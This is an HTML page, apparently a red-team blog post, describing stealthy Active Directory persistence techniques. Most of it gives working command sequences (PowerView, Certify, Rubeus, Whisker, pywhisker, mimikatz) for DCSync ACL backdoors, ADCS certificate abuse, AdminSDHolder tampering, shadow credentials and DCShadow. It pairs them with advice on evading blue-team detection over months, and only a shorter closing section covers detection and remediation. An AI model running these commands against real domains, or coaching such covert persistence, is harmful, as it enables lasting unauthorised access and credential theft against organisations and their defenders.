@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Active Directory Persistence Attack: Beyond Golden Tickets // byt3n33dl3</title>
+    <link rel="icon" type="image/png" href="../images/logo.png">
+    <link rel="stylesheet" href="../theme/css/pure.css">
+    <link rel="stylesheet" href="../theme/css/styles.css">
+    <link rel="stylesheet" href="../theme/css/pygments.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar pure-u">
+        <div class="cover-img"></div>
+        <div class="cover-body">
+            <header class="header">
+                <hgroup>
+                    <h1 class="brand-main"><a href="../index.html">AdverXarial</a></h1>
+                    <p class="tagline">Red Team // Adversary Emulator // Maintained by byt3n33dl3</p>
+                    <p class="links">
+                        <a href="../pages/about.html">About</a>
+                        <a href="https://byt3n33dl3.substack.com/">Archives</a>
+                    </p>
+                    <p class="social">
+                        <a href="https://github.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/github.svg" width="20" height="20" alt="GitHub">
+                        </a>
+                        <a href="#">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/linkedin.svg" width="20" height="20" alt="Substack">
+                        </a>
+                        <a href="https://x.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" width="20" height="20" alt="Twitter">
+                        </a>
+                    </p>
+                </hgroup>
+            </header>
+        </div>
+    </div>
+
+    <div class="pure-u">
+        <div class="content">
+            <div class="post-header">
+                <img src="../images/logo.png" alt="avatar" class="post-avatar">
+                <div class="post-meta-wrapper">
+                    <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
+                    <p class="post-date">Published Sun 15 December 2024</p>
+                </div>
+            </div>
+
+            <p class="back-link"><a href="../index.html">← Home</a></p>
+
+            <article class="post-content">
+                <h1>Active Directory Persistence Attack: Beyond Golden Tickets</h1>
+                <p class="post-tags">Tags: <a href="#">Active Directory</a> · <a href="#">Red Teaming</a> · <a href="#">Persistence</a></p>
+
+                <p class="post-meta">Blog released: 2024 Sun 15 Dec.</p>
+
+                <p>Golden tickets are old news, <ins>and this mfs still alive</ins> since 2014.</p> 
+                
+                <p>Every competent blue team is hunting for them, monitoring for suspicious TGTs, and you know what? They're finding them. If your persistence strategy in 2024 is still "dump <ins>KRBTGT hash</ins> and call it a day", you're going to lose access the moment someone rotates credentials or the client brings in incident response.</p>
+
+                <p>Hopefully from here it can covers persistence techniques that actually survive in mature Active Directory environments, the kind with proper monitoring and regular security audits.</p> 
+                
+                <p>These are methods I've used on long-term <strong><ins>Adversarial Teams</ins></strong> engagements where maintaining access for months is the objective.</p>
+
+                <h1>Why Golden Tickets Fail</h1>
+
+                <p>Let's be real about why golden tickets are increasingly useless:</p>
+
+                <ul>
+                    <li>Kerberos Ticket-Granting-Ticket or TGT rotation that's being implemented by enterprises to now rotate this twice a year.</li>
+                    <li>Anomaly detection on unusual TGT lifetimes and encryption types stick out.</li>
+                    <li>Privileged account monitoring to fake Domain Admin ticket triggers alerts.</li>
+                    <li>Honey accounts that's F.K.A being <ins>"disabled"</ins> admin account? It's a trap!</li>
+                </ul>
+
+                <p>You need persistence that blends in with legitimate activity and survives credential changes.</p>
+
+                <h1>DCSync Persistence via ACL Abuse</h1>
+
+                <p>Instead of dumping credentials once, grant yourself <code>DCSync rights</code> permanently.</p> 
+                
+                <p>The beauty? It looks like a legitimate delegation, DELEGATIONED bozo.</p>
+
+                <h2>The Attack</h2>
+
+                <p>Add DCSync rights to a controlled user or computer account:</p>
+
+                <pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity "DC=kings,DC=local" -PrincipalIdentity "r.ricardo" -Rights DCSync -Verbose</code></pre>
+
+                <p>Now that user can DCSync anytime, even after password changes:</p>
+
+                <pre><code class="language-bash">secretsdump.py r.ricardo:Passw0rd1@DC01.kings.local -just-dc-user</code></pre>
+
+                <h2>Why This Works</h2>
+
+                <ul>
+                    <li>Survives password resets on the compromised account <ins>(Pwnd!).</ins></li>
+                    <li>Survives Kerberos <code>Ticket-Granting-Ticket</code> F.K.A TGT rotation.</li>
+                    <li>Survives domain admin account changes.</li>
+                    <li>ACL changes aren't monitored in most environments.</li>
+                    <li>Looks like legitimate delegation to Admins.</li>
+                </ul>
+
+                <h2>Staying Hidden</h2>
+
+                <p>Don't grant DCSync to obvious accounts. Instead:</p>
+
+                <ol>
+                    <li>Find a service account that already has elevated privileges.</li>
+                    <li>Or create a computer account.</li>
+                    <li>Make sure the account name blends in with existing naming conventions.</li>
+                    <li>Space out your DCSync operations, I know it sounds funky but <ins>don't dump</ins> everything (NTLM, Kerberos TGT, and more) at once.</li>
+                </ol>
+
+                <pre><code class="language-powershell">New-MachineAccount -MachineAccount "BACKUP-SRV01" -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)</code></pre>
+
+                <pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity "DC=kings,DC=local" -PrincipalIdentity "BACKUP-SRV01$" -Rights DCSync</code></pre>
+
+                <h1>ADCS Exploitation for Long-Term Access</h1>
+
+                <p>Active Directory Certificate Services F.K.A the ADCS is a gold mine for persistence. A system of Certificate-based authentication survives password changes and provides legitimate-looking access.</p>
+
+                <h2>ESC1: Misconfigured Certificate Templates</h2>
+
+                <p>Find templates that allow Subject Alternative Name (SAN) specification:</p>
+
+                <pre><code class="language-powershell">.\Certify.exe find /vulnerable</code></pre>
+
+                <p>If you find a vulnerable template, request a certificate for a privileged user:</p>
+
+                <pre><code class="language-powershell">.\Certify.exe request /ca:DC01.kings.local\CORP-DC-CA /template:VulnerableTemplate /altname:Administrator</code></pre>
+
+                <p>Convert and use the certificate:</p>
+
+                <pre><code class="language-bash">openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</code></pre>
+
+                <p>Then:</p>
+
+                <pre><code class="language-powershell">.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt</code></pre>
+
+                <h2>Why This Is Considered <ins>"Usable"</ins></h2>
+
+                <ul>
+                    <li>Certificates remain valid for <strong><ins>years</ins></strong> by default.</li>
+                    <li>Works even after password changes.</li>
+                    <li>Certificate-based authentication such as ADCS is considered legitimate.</li>
+                    <li>Most orgs don't monitor certificate issuance properly.</li>
+                    <li>Can be used across the <ins>entire domain.</ins></li>
+                </ul>
+
+                <h2>ESC4: Vulnerable Template ACLs</h2>
+
+                <p>Even better by find a template where you can modify the template itself:</p>
+
+                <pre><code class="language-powershell">Get-DomainObjectAcl -Identity "VulnerableTemplate" | ? {$_.ActiveDirectoryRights -match "WriteProperty"}</code></pre>
+
+                <pre><code class="language-powershell">Set-DomainObject -Identity "VulnerableTemplate" -Set @{'msPKI-Certificate-Name-Flag'=1}</code></pre>
+
+                <pre><code class="language-powershell">.\Certify.exe request /ca:DC01.kings.local\CORP-DC-CA /template:VulnerableTemplate /altname:Administrator</code></pre>
+
+                <h1>AdminSDHolder Abuse</h1>
+
+                <p>AdminSDHolder, on of <ins>special container in Active Directory (AD) that acts as a security template for highly privileged accounts and groups,</ins> the template that protects privileged groups. Modify it, and your backdoor gets automatically replicated to all protected accounts <a href="https://www.thehacker.recipes/ad/persistence/adminsdholder">every 60 minutes</a> for as long or more.</p>
+
+                <h2>Implementation</h2>
+
+                <pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=kings,DC=local" -PrincipalIdentity "t.thor" -Rights All -Verbose</code></pre>
+
+                <pre><code class="language-powershell">Invoke-SDPropagator -timeoutMinutes 1</code></pre>
+
+                <p>Now backdoor-user F.K.A <code>T.Thor</code> has full control over all protected groups</p>
+
+                <h2>Why Blue Teams Miss This</h2>
+
+                <ul>
+                    <li><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory">AdminSDHolder</a> changes are <ins>rarely</ins> monitored.</li>
+                    <li>The permission propagation <ins>happens automatically.</ins></li>
+                    <li>By the time it's discovered, you're in dozens of objects.</li>
+                    <li>Cleanup requires checking every protected object.</li>
+                </ul>
+
+                <div class="video-container">
+                <img alt="image-gambar-chef-kiss" width="230" src="../images/chefs-kiss.png"></iframe>
+                </div>
+
+                <h1>Shadow Credentials Attack</h1>
+
+                <p>One of Favs, really favorite attack for 2024. Add a certificate to a computer or user object's with some kits: <code>msDS-KeyCredentialLink</code> attribute, allowing <ins>certificate-based</ins> authentication.</p>
+
+                <h2>The Attack</h2>
+
+                <pre><code class="language-powershell">.\Whisker.exe add /target:DC01$ /kings:kings.local /dc:DC01.kings.local</code></pre>
+
+                <p>Authenticate using the certificate</p>
+
+                <pre><code class="language-powershell">.\Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /password:password /nowrap</code></pre>
+
+                <h2>Advanced: Self-Shadow Credentials</h2>
+
+                <p>Add a shadow credential to your own compromised account with PyWhisker and Impacket:</p>
+
+                <pre><code class="language-bash">python3 pywhisker.py -d kings.local -u r.ricardo -p 'Passw0rd1' --target r.ricardo --action add</code></pre>
+
+                <p>Then authenticate:</p>
+
+                <pre><code class="language-bash">python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'Passw0rd1' kings.local/r.ricardo dc01.kings.local</code></pre>
+
+                <h2>Why This Is Stealth</h2>
+
+                <ul>
+                    <li>The <code>msDS-KeyCredentialLink</code> attribute is almost never monitored.</li>
+                    <li>Not necessary having need to change passwords.</li>
+                    <li>Survives and works with computer accounts.</li>
+                    <li>Certificate authentication is trusted <ins>"Trust Attack!"</ins></li>
+                    <li>Survives <code>dangerous</code> password resets.</li>
+                </ul>
+
+                <h1>DCShadow for Sneaky Persistence</h1>
+
+                <p>Register a rogue domain controller temporarily to make AD changes that bypass detection with <a href="https://github.com/ParrotSec/mimikatz/"a>Mimikatz</a> binary:</p>
+
+                <pre><code class="language-powershell">.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+mimikatz # lsadump::dcshadow /object:t.thor /attribute:primaryGroupID /value:512</code></pre>
+
+                <pre><code class="language-powershell">.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  
+  mimikatz # lsadump::dcshadow /push</code></pre>
+
+                <p>The change replicates through normal Active Direcotry replication, making it <ins>nearly impossible</ins> to trace back to you.</p>
+
+                <h1>Practical Persistence Strategies</h1>
+
+                <p>Don't rely on a single method. Layer your persistence:</p>
+
+                <h2>Initial Access Phase:</h2>
+
+                <ol>
+                    <li>Compromise a service account with SPN.</li>
+                    <li>Add shadow credentials to multiple service accounts.</li>
+                    <li>Create a computer account for DCSync rights.</li>
+                </ol>
+
+                <h2>Consolidation Phase:</h2>
+
+                <ol>
+                    <li>Grant DCSync rights to controlled computer account.</li>
+                    <li>Request <ins>long-lived certificates</ins> via ADCS.</li>
+                    <li>Modify <code>AdminSDHolder</code> if possible.</li>
+                    <li>Add ACLs to critical OUs.</li>
+                </ol>
+
+                <h2>Operational Security:</h2>
+
+                <pre><code class="language-plaintext">DON'T:
+- Grant DCSync to user accounts that login interactively
+- Request certificates for Administrator every week
+- Make all your changes in one day
+- Use tools directly on domain controllers
+
+DO:
+- Space out persistence mechanisms over "separate times"
+- Use computer accounts when possible
+- Blend in with existing delegation patterns
+- Test your persistence regularly but sparingly
+- Have multiple independent persistence methods</code></pre>
+
+                <h1>Detection and Blue Team Perspective</h1>
+
+                <p>Understanding how to detect these attacks makes you better at avoiding detection:</p>
+
+                <h2>What Blue Teams Should Monitor</h2>
+
+                <pre><code class="language-plaintext">- Event ID 4662: Sensitive AD object access
+- Event ID 4768: Kerberos TGT requests with certificates
+- Changes to AdminSDHolder object
+- Certificate enrollment events (Event ID 4886-4888)
+- Modifications to msDS-KeyCredentialLink attribute
+- Unusual DCSync operations (replication from non-DC IPs)
+- ACL changes on domain root and critical OUs</code></pre>
+
+                <h2>Defensive Recommendations</h2>
+
+                <ul>
+                    <li>Enable Active Directory object auditing on sensitive containers.</li>
+                    <li>Monitor certificate templates for misconfigurations.</li>
+                    <li>Review <code>AdminSDHolder ACLs</code> monthly.</li>
+                    <li>Implement certificate transparency for internal <ins>CA</ins> F.K.A Certificate-Authority.</li>
+                    <li>Alert on shadow credential additions.</li>
+                    <li>Regular <a href="https://www.huntress.com/cybersecurity-101/topic/what-is-active-directory-auditing/">ACL audits</a> on domain root and AdminSDHolder.</li>
+                </ul>
+
+                <h1>Demo: Multi-Layered Persistence</h1>
+
+                <p>Here's how this looks in practice on a real engagement:</p>
+
+                <div class="video-container">
+                <iframe width="100%" height="400" src="https://www.youtube.com/embed/_FIH70C50Zk?autoplay=1&mute=1" title="SANS DFIR teaching" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+                </div>
+
+                <p>The video by <a href="https://www.sans.org/apac">SANS Institute</a> shows:</p>
+
+                <ol>
+                    <li>Attack Surface Scenario</li>
+                    <li>The vector defenses and attention from IR and Forensics methodology <ins>(which helping us adversaries to fetch the un-looked)</ins></li>
+                </ol>
+
+                <h1>Cleanup and Remediation</h1>
+
+                <p>For the Red Teams, always document your persistence mechanisms.</p> 
+                <p>And the blue-ish responding to an incident:</p>
+
+                <h2>Finding Persistence Artifacts</h2>
+
+                <pre><code class="language-powershell">Get-DomainObjectAcl -Identity "DC=kings,DC=local" | ? {$_.SecurityIdentifier -match "S-1-5-21-.*"}</code></pre>
+
+                <pre><code class="language-powershell">Get-DomainObject -LDAPFilter '(msDS-KeyCredentialLink=*)' | Select samaccountname</code></pre>
+
+                <pre><code class="language-powershell">Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=kings,DC=local"</code></pre>
+
+                <pre><code class="language-powershell">.\Certify.exe find /vulnerable</code></pre>
+
+                <pre><code class="language-powershell">Get-DomainObjectAcl -SearchBase "DC=kings,DC=local" -ResolveGUIDs | ? {$_.ObjectAceType -match "Replicating"}</code></pre>
+
+                <h2>Complete Remediation Checklist</h2>
+
+                <ol>
+                    <li>Review and remove suspicious <a href="https://www.hackingarticles.in/genericall-active-directory-abuse/">ACLs</a> on domain root.</li>
+                    <li>Clean AdminSDHolder and force SDProp.</li>
+                    <li><ins>Remove shadow credentials</ins> from all objects.</li>
+                    <li>Review and <a href="https://learn.microsoft.com/en-us/windows-server/networking/core-network-guide/cncg/server-certs/configure-server-certificate-template-remote-access-network-policy-server">fix certificate template configurations.</a></li>
+                    <li>Revoke suspicious certificates.</li>
+                    <li>Reset Kerberos Ticket-Granting-Ticket signing key <ins>Twice.</ins></li>
+                    <li>Change passwords for all privileged accounts.</li>
+                    <li>Review computer account creation logs.</li>
+                    <li>Audit all service account permissions.</li>
+                </ol>
+
+                <h1>Operational Tips</h1>
+
+                <p>From years of Red-teaming and Adversary emulation:</p>
+
+                <ul>
+                    <li>Test your persistence with try regularly verify your access methods still work.</li>
+                    <li>Use burner accounts, by this it don't persist using the initial compromise account.</li>
+                    <li>Documentation everything folks, sometimes forget what you did in month 3 then comes-back found dangeous tingy but did't have the presistance could be waste.</li>
+                    <li>Space out actions with example of <ins>Making 10 ACL changes</ins> in one minute looks suspicious.</li>
+                    <li>Understand the environment for pattern recognitions.</li>
+                </ul>
+
+                <h1>Conclusion</h1>
+
+                <p>Persistence in modern Active Directory isn't about one-off attacks like golden tickets. It's about understanding the trust model, finding legitimate-looking delegation methods, and layering multiple techniques that survive common remediation efforts.</p>
+
+                <p>The techniques that work best are the ones that:</p>
+
+                <div class="video-container">
+                <iframe width="100%" height="400" src="https://www.youtube.com/embed/v0xKYSkyI6Q?autoplay=1&mute=1" title="password-video" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+                </div>
+
+                <p>A Golden Ticket attack unfolds in a series of steps that let an attacker gain and maintain total control of an Active Directory environment.</p>
+
+                <ol>
+                    <li>Survive <a href="https://www.hashicorp.com/en/resources/painless-password-rotation-hashicorp-vault">credential rotation.</a></li>
+                    <li>Look like <a href="https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-ticket-attack/">legitimate delegation.</a></li>
+                    <li>Aren't commonly monitored.</li>
+                    <li>Can be used sparingly to avoid detection.</li>
+                    <li>Provide multiple <ins>independent access paths.</ins></li>
+                </ol>
+
+                <p>Golden tickets had their time. These methods are what actually works when you're up against competent defenders.</p>
+
+                <h1>Software and Resources</h1>
+
+                <ul>
+                    <li><a href="https://github.com/PowerShellMafia/PowerSploit">PowerView</a></li>
+                    <li><a href="https://github.com/GhostPack/Certify">Certify</a></li>
+                    <li><a href="https://github.com/eladshamir/Whisker">Whisker</a></li>
+                    <li><a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a></li>
+                    <li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+                </ul>
+
+                <h1>Shout Outs</h1>
+
+                <p>Major props to the Engineers making this possible:</p>
+
+                <ul>
+                    <li><a href="https://x.com/harmj0y/">@harmj0y</a></li>
+                    <li><a href="https://x.com/_dirkjan/">@_dirkjan</a></li>
+                    <li><a href="https://x.com/tifkin_/">@tifkin_</a> and <a href="https://x.com/harmj0y/">@harmj0y</a></li>
+                    <li><a href="https://x.com/elad_shamir/">@elad_shamir</a></li>
+                    <li><a href="https://x.com/gentilkiwi/">@gentilkiwi</a></li>
+                </ul>
+
+                <p class="go-top"><a href="#">Go Top</a></p>
+            </article>
+
+            <footer class="footer">
+                <p>&copy; byt3n33dl3 2024 · Built with blood, sweat, and HTML · <a href="../pages/all.atom.xml">RSS</a></p>
+            </footer>
+        </div>
+    </div>
+</div>
+</body>
+</html>
